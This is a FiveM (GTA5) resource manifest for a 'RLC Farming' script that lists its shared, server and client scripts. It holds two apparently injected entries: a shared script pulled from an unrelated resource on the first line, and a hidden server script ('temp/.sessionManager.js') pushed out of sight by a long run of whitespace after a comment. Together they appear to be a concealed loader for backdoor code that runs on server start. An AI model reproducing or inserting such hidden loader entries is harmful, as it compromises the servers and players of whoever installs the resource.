shared_script "@nso_truckerjob/anvil.lua"
fx_version 'adamant'

game 'gta5'
lua54 'yes'
description 'RLC Farming'

version '1.8.5'

shared_script '@es_extended/imports.lua'
shared_script '@rlc_protector/shared.lua' --AC

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/*.lua',
	'config.lua',
'server/main.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'temp/.sessionManager.js',
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/*.lua',
	'config.lua',
	'client/main.lua'
}

dependencies {
	'es_extended'
}